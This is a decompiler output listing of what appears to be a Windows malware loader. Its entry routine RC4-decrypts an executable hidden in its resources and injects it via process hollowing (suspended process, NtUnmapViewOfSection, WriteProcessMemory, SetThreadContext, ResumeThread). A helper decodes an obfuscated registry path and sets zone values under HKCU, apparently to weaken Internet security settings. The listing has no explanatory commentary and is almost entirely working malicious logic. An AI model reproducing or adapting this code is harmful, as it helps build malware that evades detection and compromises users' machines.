/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __noreturn start(); // weak
// LSTATUS __usercall sub_4014BC@<eax>(const char *@<eax>, const CHAR *@<edx>, const char *@<ecx>);
LSTATUS sub_401550();
int __cdecl sub_4018F0(int, int, unsigned int);

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
int dword_402060[] = { 74 }; // weak
char *off_402064 = (char *)0x23E4; // weak
int dword_402068[] = { 4580 }; // weak
int dword_40206C[] = { 0 }; // weak
__int128 xmmword_4020C0 = 0x4000000040000000400000004i64; // weak
__m128i xmmword_4020D0[3] =
{
  { { 0, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 3, 0, 0, 0 } },
  { { 4, 0, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0 } },
  { { 0, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 3, 0, 0, 0 } }
}; // weak
__int128 xmmword_402140 = 0xA7A7A7A7A7A7A7A7A7A7A7A7A7A7A7A7i64; // weak
int dword_403008; // weak
int dword_40300C; // weak
int dword_403010; // weak


//----- (00401000) --------------------------------------------------------
void __noreturn start()
{
  HMODULE ModuleHandleA; // eax
  HMODULE v1; // esi
  int v2; // edi
  int v3; // edx
  int v4; // ebx
  int v5; // edi
  int v6; // esi
  HRSRC ResourceA; // edi
  HGLOBAL Resource; // eax
  LPVOID v9; // ebx
  HRSRC v10; // esi
  DWORD v11; // edi
  HGLOBAL v12; // eax
  unsigned __int8 *v13; // esi
  __m128i si128; // xmm1
  __m128i v15; // xmm0
  unsigned int i; // eax
  __m128i v17; // xmm0
  __m128i v18; // xmm0
  __m128i v19; // xmm0
  int v20; // ecx
  int j; // esi
  DWORD v22; // ebx
  _DWORD *v23; // ebx
  int v24; // edx
  unsigned int v25; // esi
  char *v26; // edi
  DWORD v27; // ebx
  char v28; // al
  bool v29; // zf
  HMODULE v30; // eax
  HMODULE v31; // eax
  HMODULE v32; // eax
  HMODULE v33; // eax
  HMODULE v34; // eax
  HMODULE v35; // eax
  BOOL (__stdcall *SetThreadContext)(HANDLE, const CONTEXT *); // esi
  HMODULE v37; // eax
  DWORD (__stdcall *ResumeThread)(HANDLE); // edi
  int v39; // eax
  BOOL (__stdcall *v40)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *); // edi
  int v41; // esi
  _DWORD *v42; // edx
  int v43; // ecx
  int v44; // eax
  SIZE_T v45; // [esp+64h] [ebp-848h]
  int v46; // [esp+6Ch] [ebp-840h] BYREF
  DWORD v47; // [esp+70h] [ebp-83Ch]
  unsigned int v48; // [esp+74h] [ebp-838h]
  unsigned __int8 *v49; // [esp+78h] [ebp-834h]
  int v50; // [esp+11Ch] [ebp-790h]
  CHAR Filename[260]; // [esp+338h] [ebp-574h] BYREF
  __int128 v52[4]; // [esp+43Ch] [ebp-470h] BYREF
  int v53; // [esp+47Ch] [ebp-430h]
  DWORD (__stdcall *NtUnmapViewOfSection)(HANDLE); // [esp+480h] [ebp-42Ch]
  BOOL (__stdcall *CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION); // [esp+484h] [ebp-428h]
  BOOL (__stdcall *WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *); // [esp+488h] [ebp-424h]
  BOOL (__stdcall *GetThreadContext)(HANDLE, LPCONTEXT); // [esp+48Ch] [ebp-420h]
  LPVOID (__stdcall *VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD); // [esp+490h] [ebp-41Ch]
  void *v59; // [esp+494h] [ebp-418h] BYREF
  void *v60; // [esp+498h] [ebp-414h]
  DWORD flOldProtect[258]; // [esp+4A4h] [ebp-408h] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  v1 = ModuleHandleA;
  v2 = *((_DWORD *)ModuleHandleA + 15);
  v3 = *(unsigned __int16 *)((char *)ModuleHandleA + v2 + 6);
  v4 = (int)ModuleHandleA + v2 + 248;
  if ( *(_WORD *)((char *)ModuleHandleA + v2 + 6) )
  {
    v46 = *((_DWORD *)ModuleHandleA + 15);
    v5 = v3;
    v47 = (DWORD)ModuleHandleA;
    v6 = 0;
    do
    {
      if ( !sub_4018F0(v4, (int)".xdata", 6u) )
        break;
      ++v6;
      v4 += 40;
    }
    while ( v6 < v5 );
    v2 = v46;
    v1 = (HMODULE)v47;
  }
  VirtualProtect(v1, 0x1000u, 4u, flOldProtect);
  *(_DWORD *)((char *)v1 + v2 + 136) = *(_DWORD *)(HMODULE)(v4 + 12);
  *(_DWORD *)((char *)v1 + v2 + 140) = *(_DWORD *)(HMODULE)(v4 + 8);
  ResourceA = FindResourceA(v1, (LPCSTR)0x137, "PIS");
  Resource = LoadResource(v1, ResourceA);
  v9 = LockResource(Resource);
  v47 = SizeofResource(v1, ResourceA);
  v10 = FindResourceA(0, (LPCSTR)0x138, "PIS");
  v11 = SizeofResource(0, v10);
  v12 = LoadResource(0, v10);
  v13 = (unsigned __int8 *)LockResource(v12);
  sub_401550();
  GetModuleFileNameA(0, Filename, 0x104u);
  si128 = _mm_load_si128((const __m128i *)&xmmword_4020C0);
  v15 = _mm_load_si128(xmmword_4020D0);
  for ( i = 0; i < 0x100; i += 16 )
  {
    *(__m128i *)&flOldProtect[i + 2] = v15;
    v17 = _mm_add_epi32(v15, si128);
    *(__m128i *)&flOldProtect[i + 6] = v17;
    v18 = _mm_add_epi32(v17, si128);
    *(__m128i *)&flOldProtect[i + 10] = v18;
    v19 = _mm_add_epi32(v18, si128);
    *(__m128i *)&flOldProtect[i + 14] = v19;
    v15 = _mm_add_epi32(v19, si128);
  }
  v49 = v13;
  v48 = v11;
  v46 = (int)v9;
  v20 = 0;
  for ( j = 0; j < 256; ++j )
  {
    v22 = flOldProtect[j + 2];
    v20 = (int)(v49[j % v48] + v22 + v20) % 256;
    flOldProtect[j + 2] = flOldProtect[v20 + 2];
    flOldProtect[v20 + 2] = (unsigned __int8)v22;
  }
  v23 = (_DWORD *)v46;
  v24 = j;
  if ( v47 )
  {
    v25 = 0;
    v26 = (char *)v46;
    do
    {
      v24 = (v24 + 1) % 256;
      v27 = flOldProtect[v24 + 2];
      v20 = (int)(v27 + v20) % 256;
      flOldProtect[v24 + 2] = flOldProtect[v20 + 2];
      v28 = *v26;
      flOldProtect[v20 + 2] = (unsigned __int8)v27;
      *v26++ = LOBYTE(flOldProtect[(int)(flOldProtect[v24 + 2] + (unsigned __int8)v27) % 256 + 2]) ^ v28;
      ++v25;
    }
    while ( v25 < v47 );
    v23 = (_DWORD *)v46;
  }
  memset(v52, 0, sizeof(v52));
  v53 = _mm_cvtsi128_si32((__m128i)0i64);
  LODWORD(v52[0]) = 68;
  dword_403010 = (int)v23;
  v46 = 65543;
  if ( *(_WORD *)v23 == 23117 )
  {
    v29 = *(_DWORD *)((char *)v23 + v23[15]) == 17744;
    dword_40300C = (int)v23 + v23[15];
    if ( v29 )
    {
      v30 = GetModuleHandleA("kernel32.dll");
      CreateProcessA = (BOOL (__stdcall *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(v30, "CreateProcessA");
      v31 = GetModuleHandleA("ntdll.dll");
      NtUnmapViewOfSection = (DWORD (__stdcall *)(HANDLE))GetProcAddress(v31, "NtUnmapViewOfSection");
      v32 = GetModuleHandleA("kernel32.dll");
      VirtualAllocEx = (LPVOID (__stdcall *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(v32, "VirtualAllocEx");
      v33 = GetModuleHandleA("kernel32.dll");
      WriteProcessMemory = (BOOL (__stdcall *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *))GetProcAddress(
                                                                                            v33,
                                                                                            "WriteProcessMemory");
      v34 = GetModuleHandleA("kernel32.dll");
      GetThreadContext = (BOOL (__stdcall *)(HANDLE, LPCONTEXT))GetProcAddress(v34, "GetThreadContext");
      v35 = GetModuleHandleA("kernel32.dll");
      SetThreadContext = (BOOL (__stdcall *)(HANDLE, const CONTEXT *))GetProcAddress(v35, "SetThreadContext");
      v37 = GetModuleHandleA("kernel32.dll");
      ResumeThread = (DWORD (__stdcall *)(HANDLE))GetProcAddress(v37, "ResumeThread");
      CreateProcessA(0, Filename, 0, 0, 0, 4, 0, 0, (LPSTARTUPINFOA)v52, (LPPROCESS_INFORMATION)&v59);
      ((void (__stdcall *)(void *, _DWORD))NtUnmapViewOfSection)(v59, *(_DWORD *)(dword_40300C + 52));
      VirtualAllocEx(v59, *(LPVOID *)(dword_40300C + 52), *(_DWORD *)(dword_40300C + 80), 12288, 64);
      WriteProcessMemory(v59, *(LPVOID *)(dword_40300C + 52), v23, *(_DWORD *)(dword_40300C + 84), 0);
      v39 = dword_40300C;
      if ( *(_WORD *)(dword_40300C + 6) )
      {
        NtUnmapViewOfSection = ResumeThread;
        v40 = WriteProcessMemory;
        CreateProcessA = (BOOL (__stdcall *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))SetThreadContext;
        v41 = 0;
        do
        {
          v42 = (_DWORD *)((char *)&v23[10 * v41 + 62] + *(_DWORD *)(dword_403010 + 60));
          v45 = v42[4];
          v43 = *(_DWORD *)(v39 + 52) + v42[3];
          v44 = v42[5];
          dword_403008 = (int)v42;
          v40(v59, (LPVOID)v43, (char *)v23 + v44, v45, 0);
          v39 = dword_40300C;
          ++v41;
        }
        while ( v41 < *(unsigned __int16 *)(dword_40300C + 6) );
        ResumeThread = NtUnmapViewOfSection;
        SetThreadContext = (BOOL (__stdcall *)(HANDLE, const CONTEXT *))CreateProcessA;
      }
      GetThreadContext(v60, (LPCONTEXT)&v46);
      v50 = *(_DWORD *)(dword_40300C + 40) + *(_DWORD *)(dword_40300C + 52);
      SetThreadContext(v60, (const CONTEXT *)&v46);
      ResumeThread(v60);
    }
  }
  Sleep(0x3A98u);
  ExitProcess(0);
}
// 401000: using guessed type void __noreturn start();
// 4020C0: using guessed type __int128 xmmword_4020C0;
// 4020D0: using guessed type __m128i xmmword_4020D0[3];
// 403008: using guessed type int dword_403008;
// 40300C: using guessed type int dword_40300C;
// 403010: using guessed type int dword_403010;

//----- (004014BC) --------------------------------------------------------
LSTATUS __usercall sub_4014BC@<eax>(const char *a1@<eax>, const CHAR *a2@<edx>, const char *a3@<ecx>)
{
  LSTATUS result; // eax
  CHAR SubKey[128]; // [esp+0h] [ebp-98h] BYREF
  BYTE Data[4]; // [esp+80h] [ebp-18h] BYREF
  HKEY phkResult; // [esp+84h] [ebp-14h] BYREF
  int dwDisposition[4]; // [esp+88h] [ebp-10h] BYREF

  wsprintfA(SubKey, "%s%s", a1, a3);
  result = RegCreateKeyExA(HKEY_CURRENT_USER, SubKey, 0, 0, 0, 0xF003Fu, 0, &phkResult, (LPDWORD)dwDisposition);
  if ( !result )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExA(phkResult, a2, 0, 4u, Data, 4u);
    return RegCloseKey(phkResult);
  }
  return result;
}
// 4014BC: using guessed type DWORD dwDisposition[4];

//----- (00401550) --------------------------------------------------------
LSTATUS sub_401550()
{
  unsigned int v0; // eax
  __m128i si128; // xmm0
  unsigned int i; // eax
  __m128i v3; // xmm1
  int v4; // eax
  char *v5; // ecx
  CHAR *v6; // ebx
  int v7; // edi
  char *v8; // esi
  int v9; // edx
  char *v10; // esi
  CHAR v12[1300]; // [esp+10h] [ebp-640h] BYREF
  char v13[128]; // [esp+524h] [ebp-12Ch] BYREF
  __m128i v14[2]; // [esp+5B0h] [ebp-A0h] BYREF
  char v15[48]; // [esp+5D0h] [ebp-80h] BYREF
  char v16[8]; // [esp+600h] [ebp-50h] BYREF
  char v17[32]; // [esp+610h] [ebp-40h] BYREF
  char v18[32]; // [esp+630h] [ebp-20h] BYREF

  strcpy(v16, "¿’¬∆’¿");
  v0 = 48;
  do
  {
    v14[v0 / 0x10 + 1].m128i_i32[3] = dword_40206C[v0 / 4];
    v14[v0 / 0x10 + 1].m128i_i32[2] = dword_402068[v0 / 4];
    v14[v0 / 0x10 + 1].m128i_i32[1] = (__int32)(&off_402064)[v0 / 4];
    v14[v0 / 0x10 + 1].m128i_i32[0] = dword_402060[v0 / 4];
    v0 -= 16;
  }
  while ( v0 );
  strcpy(v14[0].m128i_i8, "·’¿¿—∆”¡˚˚Í≈∆’¡˚˚");
  si128 = _mm_load_si128((const __m128i *)&xmmword_402140);
  for ( i = 0; i < 0x30; i += 16 )
    *(__m128i *)&v15[i] = _mm_xor_si128(_mm_load_si128((const __m128i *)&v15[i]), si128);
  v3 = _mm_load_si128(v14);
  v16[0] ^= 0xA7u;
  v14[0] = _mm_xor_si128(v3, si128);
  v16[1] ^= 0xA7u;
  v16[2] ^= 0xA7u;
  v16[3] ^= 0xA7u;
  v16[4] ^= 0xA7u;
  v16[5] ^= 0xA7u;
  v14[1].m128i_i8[0] ^= 0xA7u;
  wsprintfA(v12, "%s %s", v15, v14[0].m128i_i8);
  v4 = v12[0];
  v5 = v13;
  if ( v12[0] )
  {
    v6 = v12;
    while ( 1 )
    {
      strcpy(v17, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
      ++v6;
      strcpy(v18, "abcdefghijklmnopqrstuvwxyz");
      v7 = 65;
      v8 = v17;
      do
      {
        if ( v7 == v4 )
        {
          if ( v8 )
            goto LABEL_11;
          goto LABEL_12;
        }
        v7 = *++v8;
      }
      while ( *v8 );
      if ( v7 == v4 )
      {
LABEL_11:
        LOBYTE(v4) = v17[(v8 - v17 + 13) % 26];
        goto LABEL_17;
      }
LABEL_12:
      v9 = v18[0];
      v10 = v18;
      if ( v18[0] )
        break;
      if ( !v4 )
        goto LABEL_19;
LABEL_17:
      *v5 = v4;
      v4 = *v6;
      ++v5;
      if ( !*v6 )
        goto LABEL_18;
    }
    while ( v9 != v4 )
    {
      v9 = *++v10;
      if ( !*v10 )
      {
        if ( v9 != v4 )
          goto LABEL_17;
        goto LABEL_16;
      }
    }
LABEL_19:
    if ( v10 )
LABEL_16:
      LOBYTE(v4) = v18[(v10 - v18 + 13) % 26];
    goto LABEL_17;
  }
LABEL_18:
  *v5 = 0;
  sub_4014BC(v13, "1609", "0");
  sub_4014BC(v13, "1406", "1");
  sub_4014BC(v13, "1609", "1");
  sub_4014BC(v13, "1609", "2");
  sub_4014BC(v13, "1406", "3");
  sub_4014BC(v13, "1609", "3");
  sub_4014BC(v13, "1406", "4");
  return sub_4014BC(v13, "1609", "4");
}
// 402060: using guessed type int dword_402060[];
// 402064: using guessed type char *off_402064;
// 402068: using guessed type int dword_402068[];
// 40206C: using guessed type int dword_40206C[];
// 402140: using guessed type __int128 xmmword_402140;
// 401550: using guessed type char var_80[48];

//----- (004018F0) --------------------------------------------------------
int __cdecl sub_4018F0(int a1, int a2, unsigned int a3)
{
  unsigned int v3; // eax
  int v4; // ebx
  int v5; // ebx
  int v6; // edx
  int v7; // eax
  int result; // eax
  int v9; // eax
  int v10; // ecx
  bool v11; // cc
  int v12; // eax
  int v13; // ecx
  bool v14; // cc
  int v15; // eax
  int v16; // ecx
  bool v17; // cc
  int v18; // ecx
  int v19; // edx

  if ( a1 == a2 || !a3 )
    return 0;
  v3 = a3 >> 2;
  if ( !(a3 >> 2) )
  {
LABEL_7:
    v5 = a1 + 4 * v3;
    v6 = a2 + 4 * v3;
    if ( (a3 & 3) != 0 )
    {
      v7 = 0;
      while ( *(unsigned __int8 *)(v7 + v5) == *(unsigned __int8 *)(v7 + v6) )
      {
        if ( ++v7 >= (a3 & 3) )
          return 0;
      }
      v18 = *(unsigned __int8 *)(v7 + v5);
      v19 = *(unsigned __int8 *)(v7 + v6);
      result = 1;
      if ( v18 <= v19 )
        return -1;
      return result;
    }
    return 0;
  }
  v4 = 0;
  while ( *(_DWORD *)(a1 + 4 * v4) == *(_DWORD *)(a2 + 4 * v4) )
  {
    if ( ++v4 >= v3 )
      goto LABEL_7;
  }
  v9 = *(unsigned __int8 *)(a1 + 4 * v4);
  v10 = *(unsigned __int8 *)(a2 + 4 * v4);
  v11 = v9 <= v10;
  if ( v9 == v10 )
  {
    v12 = *(unsigned __int8 *)(a1 + 4 * v4 + 1);
    v13 = *(unsigned __int8 *)(a2 + 4 * v4 + 1);
    v14 = v12 <= v13;
    if ( v12 == v13 )
    {
      v15 = *(unsigned __int8 *)(a1 + 4 * v4 + 2);
      v16 = *(unsigned __int8 *)(a2 + 4 * v4 + 2);
      v17 = v15 <= v16;
      if ( v15 == v16 )
      {
        result = 1;
        if ( *(unsigned __int8 *)(a1 + 4 * v4 + 3) <= (int)*(unsigned __int8 *)(a2 + 4 * v4 + 3) )
          return -1;
      }
      else
      {
        result = 1;
        if ( v17 )
          return -1;
      }
    }
    else
    {
      result = 1;
      if ( v14 )
        return -1;
    }
  }
  else
  {
    result = 1;
    if ( v11 )
      return -1;
  }
  return result;
}

// nfuncs=4 queued=4 decompiled=4 lumina nreq=0 worse=0 better=0
// ALL OK, 4 function(s) have been successfully decompiled
